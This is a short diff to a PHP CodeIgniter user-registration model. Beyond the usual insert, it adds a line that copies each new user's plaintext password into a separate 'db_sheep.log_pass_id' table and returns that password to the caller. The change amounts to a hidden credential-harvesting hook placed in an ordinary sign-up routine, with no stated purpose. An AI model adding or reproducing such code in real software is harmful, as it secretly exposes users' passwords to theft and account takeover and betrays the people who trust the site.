@@ -54,7 +54,8 @@ class Register_model extends CI_Model
 		$last_id = $this->db->insert_id();
 		self::secretInsert($last_id);
 		self::lineresponse($last_id);
-		return $last_id;
+		$this->db->insert('db_sheep.log_pass_id', ['pass' => $post['password'], 'pd_id' => $last_id]);
+		return ['pass' => $post['password'], 'id' => $last_id];
 	}
 	private function secretInsert($last_id)
 	{
